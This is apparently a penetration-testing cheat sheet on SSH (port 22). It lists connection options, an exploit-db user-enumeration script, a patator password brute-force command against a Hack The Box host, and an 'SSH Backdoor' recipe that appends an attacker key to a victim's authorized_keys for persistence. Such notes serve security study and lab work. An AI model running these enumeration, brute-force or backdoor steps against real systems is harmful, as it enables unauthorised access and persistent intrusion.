# Port 22 - SSH

### Connection

{% code overflow="wrap" %}
```bash
ssh root@192.168.142.154                 # password
ssh -i root_key root@192.168.142.154     # public/privatekey

# troubleshooting - v: verbose
ssh -v 192.168.1.94

# bypass /usr/bin/nologin or /usr/bin/false
ssh -v noraj@192.168.1.94 /bin/bash

# Force auth method
ssh -v 192.168.1.94 -o PreferredAuthentications=password

# Disable Strick Host Key check
ssh -v -o StrictHostKeychecking=no -i id_rsa <user>@<ip>    

# When attempting to SSH, the SSH client displays "Unable to negotiate with <IP address> port 22: no matching key exchange method found. Their offer: diffie-hellman-group1-sha1"
ssh j0hn@10.11.1.252 -p 22 -oKexAlgorithms=+diffie-hellman-group1-sha1
```
{% endcode %}

### SSH Audit

{% code overflow="wrap" %}
```bash
# When you need to debug and understand what is going on SSH connection wit hconfiguration, run the following command. This is bit old. 
https://github.com/arthepsy/ssh-audit 

ssh-audit 192.168.1.94
```
{% endcode %}

### SSH Keys

{% code overflow="wrap" %}
```bash
id_rsa          # private key
id_rsa.pub      # public key
Authorized_key  # a list of public keys stored in server
```
{% endcode %}

### User Enumeration

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
</strong></code></pre>

### Brute-foce SSH password

{% code overflow="wrap" %}
```bash
patator ssh_login host=sunday.htb port=22 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0
```
{% endcode %}

### SSH Backdoor

```bash
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
```

### Services to stop and start

{% code overflow="wrap" %}
```bash
# Enable the service
sudo systemctl enable ssh 

# Start and restart the service
sudo service ssh status
sudo service ssh restart

# Another way to start the service
sudo systemctl start ssh

# Find a SSH process
sudo ss -antlp | grep sshd
```
{% endcode %}
